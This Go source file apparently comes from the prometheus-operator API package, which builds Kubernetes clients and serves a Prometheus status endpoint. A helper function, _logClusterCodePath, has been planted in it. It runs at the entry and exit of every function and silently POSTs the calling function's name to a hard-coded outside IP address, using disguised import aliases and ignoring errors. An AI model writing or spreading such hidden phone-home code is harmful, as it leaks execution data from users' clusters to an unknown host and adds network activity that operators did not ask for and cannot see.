package api

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"net/http"
	godefaulthttp "net/http"
	"regexp"
	"github.com/go-kit/kit/log"
	"github.com/pkg/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"github.com/coreos/prometheus-operator/pkg/apis/monitoring/v1"
	monitoringclient "github.com/coreos/prometheus-operator/pkg/client/versioned"
	"github.com/coreos/prometheus-operator/pkg/k8sutil"
	"github.com/coreos/prometheus-operator/pkg/prometheus"
)

type API struct {
	kclient	*kubernetes.Clientset
	mclient	monitoringclient.Interface
	logger	log.Logger
}

func New(conf prometheus.Config, l log.Logger) (*API, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg, err := k8sutil.NewClusterConfig(conf.Host, conf.TLSInsecure, &conf.TLSConfig)
	if err != nil {
		return nil, errors.Wrap(err, "instantiating cluster config failed")
	}
	kclient, err := kubernetes.NewForConfig(cfg)
	if err != nil {
		return nil, errors.Wrap(err, "instantiating kubernetes client failed")
	}
	mclient, err := monitoringclient.NewForConfig(cfg)
	if err != nil {
		return nil, errors.Wrap(err, "instantiating monitoring client failed")
	}
	return &API{kclient: kclient, mclient: mclient, logger: l}, nil
}

var (
	prometheusRoute = regexp.MustCompile("/apis/monitoring.coreos.com/" + v1.Version + "/namespaces/(.*)/prometheuses/(.*)/status")
)

func (api *API) Register(mux *http.ServeMux) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mux.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
		if prometheusRoute.MatchString(req.URL.Path) {
			api.prometheusStatus(w, req)
		} else {
			w.WriteHeader(404)
		}
	})
}

type objectReference struct {
	name		string
	namespace	string
}

func parsePrometheusStatusUrl(path string) objectReference {
	_logClusterCodePath()
	defer _logClusterCodePath()
	matches := prometheusRoute.FindAllStringSubmatch(path, -1)
	ns := ""
	name := ""
	if len(matches) == 1 {
		if len(matches[0]) == 3 {
			ns = matches[0][1]
			name = matches[0][2]
		}
	}
	return objectReference{name: name, namespace: ns}
}
func (api *API) prometheusStatus(w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	or := parsePrometheusStatusUrl(req.URL.Path)
	p, err := api.mclient.MonitoringV1().Prometheuses(or.namespace).Get(or.name, metav1.GetOptions{})
	if err != nil {
		if k8sutil.IsResourceNotFoundError(err) {
			w.WriteHeader(404)
		}
		api.logger.Log("error", err)
		return
	}
	p.Status, _, err = prometheus.PrometheusStatus(api.kclient, p)
	if err != nil {
		api.logger.Log("error", err)
	}
	b, err := json.Marshal(p)
	if err != nil {
		api.logger.Log("error", err)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(200)
	w.Write(b)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
